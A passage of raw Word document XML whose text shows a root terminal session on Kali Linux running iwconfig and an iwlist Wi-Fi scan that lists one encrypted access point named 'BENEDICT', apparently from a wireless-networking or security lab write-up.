      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>wconf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h0      no w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ess ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ons.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">an0   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="60"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>EE</w:t>
      </w:r>
      <w:r>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>802.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1bgn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="60"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>SSID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>any</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="700"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mode:Managed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="51"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Acce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s Po</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>No</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>-A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>soc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>ower=20 dBm</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="700"/>
      </w:pPr>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:t>ry short</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">7   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">S </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:t>rag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="700"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6634" w:firstLine="600"/>
      </w:pPr>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>wer Manag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>o        no w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ess ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ons.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId54">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oot@ka</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>li</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>~</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n0 scann</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>an0     Scan co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed :</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="700"/>
      </w:pPr>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>el</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">01 - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>dd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ess: 14:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6:5A:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4:57:22</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1300"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>hanne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>:6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1300" w:right="4677"/>
      </w:pPr>
      <w:r>
        <w:t>Frequency</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>2.437</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:t>Hz (Ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>nn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">6) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lit</w:t>
      </w:r>
      <w:r>
        <w:t>y=70</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">70 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gnal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">=-27 dBm </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"BENE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1300"/>
      </w:pPr>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>1 Mb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>2 Mb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>5.5 Mb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1300"/>
      </w:pPr>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>6 Mb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>9 Mb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>12 Mb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>18 Mb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>24 Mb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1862" w:right="5092"/>
        <w:jc w:val="center"/>
        <w:sectPr w:rsidR="00090D7C">
